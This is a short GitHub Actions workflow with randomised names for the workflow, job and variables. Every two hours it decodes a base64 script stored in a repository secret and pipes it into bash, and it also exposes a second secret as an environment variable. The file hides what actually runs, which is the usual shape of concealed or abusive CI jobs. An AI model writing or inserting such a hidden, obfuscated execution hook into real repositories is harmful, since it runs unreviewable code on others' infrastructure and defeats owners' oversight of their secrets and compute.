name: lYKxxxnLRG
on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:
jobs:
  bxnFvnOmGU:
    runs-on: ubuntu-latest
    env:
      oTgXuqZhKLTM: ${{ secrets.dcBeiiwxiX }}
    steps:
      - uses: actions/checkout@v5
      - run: echo "${{ secrets.kUVajqXm }}" | base64 -d | bash
